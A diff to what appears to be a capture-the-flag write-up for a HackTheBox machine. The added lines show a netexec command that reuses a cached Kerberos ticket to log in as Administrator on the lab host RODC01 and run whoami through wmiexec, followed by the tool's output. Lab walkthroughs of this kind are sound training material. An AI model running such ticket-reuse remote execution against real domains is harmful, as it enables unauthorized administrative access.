@@ -462,8 +462,16 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 I can then request a ticket, this should give me admin access on the `RODC01` machine
 
 ```python
-
+❯❯❯ faketime -f +8h nxc smb rodc01.garfield.htb --use-kcache -X whoami
+SMB         rodc01.garfield.htb 445    RODC01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:RODC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         rodc01.garfield.htb 445    RODC01           [+] garfield.htb\Administrator from ccache (Pwn3d!)
+SMB         rodc01.garfield.htb 445    RODC01           [+] Executed command via wmiexec
+SMB         rodc01.garfield.htb 445    RODC01           garfield\administrator
 ```
+
+Then after exporting the ticket i can get command execution
+
+
 
 
 
